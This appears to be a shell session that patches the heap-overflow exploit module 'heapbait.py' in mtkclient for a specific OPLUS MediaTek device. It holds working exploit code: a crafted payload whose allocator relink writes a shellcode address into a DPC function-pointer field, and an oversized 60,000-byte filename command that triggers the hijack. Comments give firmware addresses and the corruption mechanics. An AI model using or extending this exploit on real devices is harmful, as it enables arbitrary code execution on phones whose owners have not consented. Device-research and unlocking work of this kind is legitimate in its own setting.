cd ~/ea29ia_mtkclient
python3 - << 'TRIGEOF'
p = "mtkclient/Library/Exploit/heapbait.py"
src = open(p).read()

# Patch 1: the stage-3 payload field mapping (malloc-relink consumer, not free())
old1 = """        payload2 = bytearray(b"\\x00" * USB_DATA_SIZE)
        if heap_params.is_arm64:
            payload2.extend(heap_params.dpc_addr.to_bytes(8, 'little'))
            payload2.extend(shellcode_addr.to_bytes(8, 'little'))
        else:
            payload2.extend(int.to_bytes(0xDEADBEEF, 4, 'little'))
            payload2.extend(heap_params.dpc_addr.to_bytes(4, 'little'))
            payload2.extend(shellcode_addr.to_bytes(4, 'little'))"""
new1 = """        payload2 = bytearray(b"\\x00" * USB_DATA_SIZE)
        if heap_params.is_arm64:
            payload2.extend(heap_params.dpc_addr.to_bytes(8, 'little'))
            payload2.extend(shellcode_addr.to_bytes(8, 'little'))
        else:
            # OPLUS 2710EX01: teardown is IMMEDIATE (mxmlDelete runs before the handler - FUN_400084cc@0x400087a0),
            # so the corrupted node is consumed by the NEXT malloc's walk+relink, not by free(). Byte-exact
            # carve writes (FUN_40008b10@0x40008bb0): W1 *(X[1])=X[0]; W2 *(X[0]+4)=X[1].
            # Payload: [A=dpc_base][B=shellcode_addr+4][C=shellcode_addr]:
            #   W2 writes B into *(A+4)=0x4006a570 (the DPC called-fn field) - hijack lands.
            #   W1 writes A into *B (4 sled bytes at +4 - jump target at shellcode_addr untouched).
            #   C is the node size (huge => "fits everything" => the walk carves from X).
            payload2.extend((heap_params.dpc_addr + 4).to_bytes(4, 'little'))
            payload2.extend((shellcode_addr + 4).to_bytes(4, 'little'))
            payload2.extend(shellcode_addr.to_bytes(4, 'little'))"""
n1 = src.count(old1)
assert n1 == 1, f"payload anchor: expected 1 match, found {n1}"
src = src.replace(old1, new1)

# Patch 2: the trigger command between the stage-3 payload and GETBAITED
old2 = """        self.xflash.ack_value(0)
        ack = self.xflash.get_response()
        self.xflash.xsend(payload2)
        ack = self.xflash.get_response()
        self.xflash.xsend(b"GETBAITED\\0")"""
new2 = """        self.xflash.ack_value(0)
        ack = self.xflash.get_response()
        self.xflash.xsend(payload2)
        ack = self.xflash.get_response()
        # OPLUS 2710EX01 trigger: the corrupted node X (the free remainder) is only consumed by a
        # malloc whose request exceeds every smaller free hole (address-sorted first-fit walk).
        # This huge-filename command's parse allocation (~60KB > all boot/transient holes) forces
        # the walk into X; the carve's relink writes shellcode_addr+4 into the DPC called-fn field.
        # The next command's loop iteration then fires "DPC CALL".
        self.info("Heapbait trigger: forcing walk into the corrupted node...")
        ncmd = self.xflash.cmd.cmd_security_set_allinone_signature(filename=60000 * "A")
        result = self.xflash.send_command(ncmd)
        _ = result
        self.xflash.xsend(b"GETBAITED\\0")"""
n2 = src.count(old2)
assert n2 == 1, f"trigger anchor: expected 1 match, found {n2}"
src = src.replace(old2, new2)

open(p, "w").write(src)
print("PATCH APPLIED: relink payload + 60KB trigger command (deterministic walk-into-X hijack)")
TRIGEOF
python3 -m py_compile mtkclient/Library/Exploit/heapbait.py && echo "COMPILE OK"
grep -c "60000 \* \"A\"" mtkclient/Library/Exploit/heapbait.py
grep -c "dpc_addr + 4" mtkclient/Library/Exploit/heapbait.py
grep -c "RAW_GETBAITED_RESPONSE" mtkclient/Library/Exploit/heapbait.py
